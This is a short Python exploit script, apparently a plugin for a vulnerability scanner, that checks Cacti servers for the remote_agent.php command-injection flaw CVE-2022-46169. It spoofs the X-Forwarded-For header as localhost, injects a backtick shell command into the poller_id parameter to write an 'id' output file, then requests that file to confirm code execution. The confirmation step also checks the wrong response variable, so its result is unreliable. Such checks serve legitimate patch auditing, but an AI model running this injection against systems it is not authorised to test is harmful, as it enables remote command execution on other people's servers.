#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/webapp/Cacti/Cacti remote_agent.php 远程命令执行漏洞 CVE-2022-46169.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Cacti remote_agent.php 远程命令执行 CVE-2022-46169',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r1 = randomLowercase(8)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'X-Forwarded-For': '127.0.0.1'
      }
  target = f"/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`id>{r1}.txt`"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and 'local_data_id":' in res.text:
      res.close()
    else:
      return ret
  except:
    return ret
  try:
    resp = requests.get(url=url+f'/{r1}.txt',headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',res.text,re.S):
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret